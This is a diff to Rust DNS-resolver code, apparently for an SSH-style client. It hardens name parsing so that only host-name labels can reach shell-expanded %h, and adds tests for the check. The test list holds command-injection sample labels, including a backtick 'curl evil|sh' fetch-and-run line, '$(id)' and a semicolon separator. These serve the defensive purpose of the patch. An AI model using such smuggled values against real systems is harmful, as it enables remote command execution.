@@ -229,7 +229,24 @@ fn tcp_exchange(addr: SocketAddr, query: &[u8], timeout: Duration) -> Option<Vec
     Some(buf)
 }
 
-/// The (possibly compressed) name at `pos`, as dotted text.
+/// Whether `label` is one a host name can have: `[A-Za-z0-9_-]` only. The
+/// wire format lets a label hold any byte; names read from it end up in
+/// `%h`, which the configuration expands into shell commands (`Match exec`,
+/// `LocalCommand`, `ProxyCommand`), so nothing else is let through.
+fn host_label(label: &[u8]) -> bool {
+    !label.is_empty()
+        && label.len() <= 63
+        && label
+            .iter()
+            .all(|b| b.is_ascii_alphanumeric() || *b == b'_' || *b == b'-')
+}
+
+/// The longest host name, as dotted text.
+const MAX_NAME_LEN: usize = 253;
+
+/// The (possibly compressed) name at `pos`, as dotted text. `None` for a
+/// malformed name and for one that is not a host name: a label with a byte
+/// outside `[A-Za-z0-9_-]` ([`host_label`]), or over 253 bytes in all.
 fn read_name(msg: &[u8], mut pos: usize) -> Option<String> {
     let mut out = String::new();
     // Each pointer must go backwards, so this ends.
@@ -248,10 +265,16 @@ fn read_name(msg: &[u8], mut pos: usize) -> Option<String> {
             0x00 if len == 0 => return Some(out),
             0x00 => {
                 let label = msg.get(pos + 1..pos + 1 + usize::from(len))?;
+                if !host_label(label) {
+                    return None;
+                }
                 if !out.is_empty() {
                     out.push('.');
                 }
                 out.push_str(core::str::from_utf8(label).ok()?);
+                if out.len() > MAX_NAME_LEN {
+                    return None;
+                }
                 pos += 1 + usize::from(len);
             }
             _ => return None,
@@ -270,6 +293,14 @@ pub fn canonical_name(name: &str) -> Option<String> {
         match lookup_with(&rc, &current, TYPE_CNAME) {
             Ok(set) => {
                 let target = String::from_utf8(set.rdatas.first()?.clone()).ok()?;
+                // `read_name` only yields host names; the root (empty) is
+                // not one either.
+                if target.is_empty()
+                    || target.len() > MAX_NAME_LEN
+                    || !target.split('.').all(|l| host_label(l.as_bytes()))
+                {
+                    return None;
+                }
                 current = target;
                 followed = true;
             }
@@ -498,6 +529,62 @@ mod dns_tests {
         assert_eq!(set.rdatas, vec![b"www.h.example".to_vec()]);
         // A pointer forwards (or to itself) is refused.
         assert_eq!(read_name(&[0xc0, 0], 0), None);
+    }
+
+    /// A CNAME target is spliced into `%h`, so only host-name labels pass.
+    #[test]
+    fn cname_targets_with_non_hostname_bytes_are_refused() {
+        let name = |labels: &[&[u8]]| {
+            let mut m = Vec::new();
+            for l in labels {
+                m.push(l.len() as u8);
+                m.extend_from_slice(l);
+            }
+            m.push(0);
+            m
+        };
+        assert_eq!(
+            read_name(&name(&[b"db_1", b"corp-x", b"Example", b"com"]), 0).as_deref(),
+            Some("db_1.corp-x.Example.com")
+        );
+        for bad in [
+            &b"x`curl evil|sh`"[..],
+            b"a b",
+            b"a;b",
+            b"$(id)",
+            b"a/b",
+            b"a\nb",
+            b"a.b",
+            b"a\0b",
+            b"*",
+            b"caf\xc3\xa9",
+            b"\x1b[2J",
+        ] {
+            assert_eq!(
+                read_name(&name(&[bad, b"corp", b"example", b"com"]), 0),
+                None,
+                "{bad:?}"
+            );
+            // The whole reply is a failed lookup.
+            let mut rdata = name(&[bad]);
+            rdata.pop();
+            rdata.extend_from_slice(&[0xc0, 12]);
+            assert_eq!(
+                parse_reply(
+                    &reply(9, [0x81, 0x80], &[(TYPE_CNAME, &rdata)]),
+                    9,
+                    TYPE_CNAME
+                ),
+                Err(DnsError::Fail),
+                "{bad:?}"
+            );
+        }
+        // 253 bytes of dotted text at most.
+        let label = [b'a'; 63];
+        let ok = name(&[&label, &label, &label, &label[..61]]);
+        assert_eq!(read_name(&ok, 0).map(|n| n.len()), Some(253));
+        let long = name(&[&label, &label, &label, &label[..62]]);
+        assert_eq!(read_name(&long, 0), None);
     }
 
     #[test]
